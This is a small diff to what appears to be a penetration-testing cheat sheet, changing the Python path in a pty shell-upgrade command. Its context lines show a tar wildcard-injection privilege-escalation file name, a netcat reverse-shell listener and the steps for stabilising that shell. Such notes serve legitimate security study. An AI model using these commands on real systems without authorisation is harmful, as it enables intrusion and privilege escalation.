@@ -94,7 +94,7 @@ touch /home/user/--checkpoint-action=exec=privesc.sh
 bash
 rlwrap nc -lvnp $port
 which python python2 python3
-/usr/bin/python3 -c "import pty; pty.spawn('/bin/bash')"; #spawn a python psuedo-shell
+/usr/bin/python -c "import pty; pty.spawn('/bin/bash')"; #spawn a python psuedo-shell
 CTRL+Z # to background shell
 echo $TERM
 stty raw -echo # Send control characters to the shell.
